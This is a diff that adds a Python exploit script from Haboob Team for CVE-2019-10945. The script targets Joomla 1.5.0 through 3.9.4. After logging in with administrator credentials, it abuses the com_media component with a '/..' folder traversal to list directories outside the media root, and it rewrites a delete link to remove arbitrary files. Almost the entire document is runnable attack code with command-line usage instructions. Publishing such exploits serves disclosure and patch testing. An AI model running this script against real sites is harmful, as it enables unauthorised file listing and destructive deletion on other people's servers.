@@ -1,0 +1,180 @@
+# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
+# Date: 2019-March-13
+# Exploit Author: Haboob Team
+# Web Site: haboob.sa
+# Email: research@haboob.sa
+# Software Link: https://www.joomla.org/
+# Versions: Joomla 1.5.0 through Joomla 3.9.4
+# CVE : CVE-2019-10945
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945
+#
+# Usage:
+#  List files in the specified directory:
+#  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory name>
+#
+#  Delete file in specified directory
+#  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory to list>  --rm=<file name>
+
+
+import re
+import tempfile
+import pickle
+import os
+import hashlib
+import urllib
+
+try:
+    import click
+except ImportError:
+    print("module 'click' doesn't exist, type: pip install click")
+    exit(0)
+
+try:
+    import requests
+except ImportError:
+    print("module 'requests' doesn't exist, type: pip install requests")
+    exit(0)
+try:
+    import lxml.html
+except ImportError:
+    print("module 'lxml' doesn't exist, type: pip install lxml")
+    exit(0)
+
+mediaList = "?option=com_media&view=mediaList&tmpl=component&folder=/.."
+
+print ''' 
+# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
+# Web Site: Haboob.sa
+# Email: research@haboob.sa
+# Versions: Joomla 1.5.0 through Joomla 3.9.4
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
+ _    _          ____   ____   ____  ____  
+| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
+| |__| |  /  \  | |_) | |  | | |  | | |_) |
+|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
+| |  | |/ ____ \| |_) | |__| | |__| | |_) |
+|_|  |_/_/    \_\____/ \____/ \____/|____/ 
+                                                                       
+'''
+class URL(click.ParamType):
+    name = 'url'
+    regex = re.compile(
+        r'^(?:http)s?://'  # http:// or https://
+        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
+        r'localhost|'  # localhost...
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
+        r'(?::\d+)?'  # optional port
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
+
+    def convert(self, value, param, ctx):
+        if not isinstance(value, tuple):
+            if re.match(self.regex, value) is None:
+                self.fail('invalid URL (%s)' % value, param, ctx)
+        return value
+
+
+def getForm(url, query, cookie=''):
+    r = requests.get(url, cookies=cookie, timeout=5)
+    if r.status_code != 200:
+        print("invalid URL: 404 NOT FOUND!!")
+        exit(0)
+    page = r.text.encode('utf-8')
+    html = lxml.html.fromstring(page)
+    return html.xpath(query), r.cookies
+
+
+def login(url, username, password):
+    csrf, cookie = getForm(url, '//input/@name')
+    postData = {'username': username, 'passwd': password, 'option': 'com_login', 'task': 'login',
+                'return': 'aW5kZXgucGhw', csrf[-1]: 1}
+
+    res = requests.post(url, cookies=cookie.get_dict(), data=postData, allow_redirects=False)
+    if res.status_code == 200:
+        html = lxml.html.fromstring(res.text)
+        msg = html.xpath("//div[@class='alert-message']/text()[1]")
+        print msg
+        exit()
+    else:
+        get_cookies(res.cookies.get_dict(), url, username, password)
+
+
+def save_cookies(requests_cookiejar, filename):
+    with open(filename, 'wb') as f:
+        pickle.dump(requests_cookiejar, f)
+
+
+def load_cookies(filename):
+    with open(filename, 'rb') as f:
+        return pickle.load(f)
+
+
+def cookies_file_name(url, username, password):
+    result = hashlib.md5(str(url) + str(username) + str(password))
+    _dir = tempfile.gettempdir()
+    return _dir + "/" + result.hexdigest() + ".Jcookie"
+
+
+def get_cookies(req_cookie, url, username, password):
+    cookie_file = cookies_file_name(url, username, password)
+    if os.path.isfile(cookie_file):
+        return load_cookies(cookie_file)
+    else:
+        save_cookies(req_cookie, cookie_file)
+        return req_cookie
+
+
+def traversal(url, username, password, dir=None):
+    cookie = get_cookies('', url, username, password)
+    url = url + mediaList + dir
+    files, cookie = getForm(url, "//input[@name='rm[]']/@value", cookie)
+    for file in files:
+        print file
+    pass
+
+
+def removeFile(baseurl, username, password, dir='', file=''):
+    cookie = get_cookies('', baseurl, username, password)
+    url = baseurl + mediaList + dir
+    link, _cookie = getForm(url, "//a[@target='_top']/@href", cookie)
+    if link:
+        link = urllib.unquote(link[0].encode("utf8"))
+        link = link.split('folder=')[0]
+        link = link.replace("folder.delete", "file.delete")
+        link = baseurl + link + "folder=/.." + dir + "&rm[]=" + file
+        msg, cookie = getForm(link, "//div[@class='alert-message']/text()[1]", cookie)
+        if len(msg) == 0:
+            print "ERROR : File does not exist"
+        else:
+            print msg
+    else:
+        print "ERROR:404 NOT FOUND!!"
+
+
+@click.group(invoke_without_command=True)
+@click.option('--url', type=URL(), help="Joomla Administrator URL", required=True)
+@click.option('--username', type=str, help="Joomla Manager username", required=True)
+@click.option('--password', type=str, help="Joomla Manager password", required=True)
+@click.option('--dir', type=str, help="listing directory")
+@click.option('--rm', type=str, help="delete file")
+@click.pass_context
+def cli(ctx, url, username, password, dir, rm):
+    url = url+"/"
+    cookie_file = cookies_file_name(url, username, password)
+    if not os.path.isfile(cookie_file):
+        login(url, username, password)
+    if dir is not None:
+        dir = dir.lstrip('/')
+        dir = dir.rstrip('/')
+        dir = "/" + dir
+        if dir == "/" or dir == "../" or dir == "/.":
+            dir = ''
+    else:
+        dir = ''
+    print dir
+    if rm is not None:
+        removeFile(url, username, password, dir, rm)
+    else:
+        traversal(url, username, password, dir)
+
+
+cli()
